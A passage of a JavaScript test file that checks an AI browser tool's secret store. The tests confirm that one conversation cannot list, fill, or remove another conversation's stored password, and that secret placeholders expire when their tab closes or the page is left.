    const other = "another-conversation";
    const opened = await browse("open", { url: `${allowedOrigin}/signin` }, other);
    const observed = await browse("observe", { tabId: opened.tabId, mode: "interactive" }, other);
    assert.equal(observed.availableSecrets, undefined);
    const password = observed.elements.find((item) => item.role === "textbox" && /Password/.test(item.name ?? "")).ref;
    const refused = await browse("act", { tabId: opened.tabId, observationId: observed.observationId, request_id: "borrowed-handle",
      actions: [{ type: "fill_secret", ref: password, secretRef: secret.secretRef }] }, other);
    assert.equal(refused.ok, false);
    assert.equal(refused.code, "unknown_secret");
    assert.equal(await computer.request(other), null, "no one is asked about a secret that conversation does not have");
    assert.deepEqual(await computer.secrets.list(other), []);
    assert.equal(await computer.secrets.remove(other, secret.secretRef), false);
    // The first conversation still has it when it gets the computer back.
    assert.deepEqual(await computer.secrets.list(SESSION), [secret]);
    assert.equal(await passwordField(opened.tabId), "");
  });

  test("a placeholder stops working when its tab closes underneath or its page is left", async () => {
    reset();
    const host = cloudBrowser();
    const left = await sendFromLab(host, "form");
    await allowed.received("/form");
    for (const deadline = Date.now() + 5000; Date.now() < deadline && host.secrets.live(left.tabId); await wait(50));
    assert.equal(host.secrets.live(left.tabId), false, "the document that held the placeholder is gone");
    assert.deepEqual(states(host.secrets, left.tabId), ["sent"]);

    const page = await host.open(`${allowedOrigin}/`);
    const secret = host.secrets.add({ sessionId: SESSION, label: "Closing tab", kind: "password", origins: [allowedOrigin], value: VALUE });
    host.secrets.issue({ sessionId: SESSION, secretRef: secret.secretRef, tabId: page.tabId, origin: allowedOrigin, ref: page.control("textbox", /Access key/) });
    assert.equal(host.secrets.live(page.tabId), true);
    await fetch(`${chromium.endpoint}/json/close/${page.tabId}`);
    for (const deadline = Date.now() + 5000; Date.now() < deadline && host.secrets.live(page.tabId); await wait(50));
    assert.equal(host.secrets.live(page.tabId), false);
    assert.deepEqual(states(host.secrets, page.tabId), ["not_sent:interception_lost"]);
  });
});
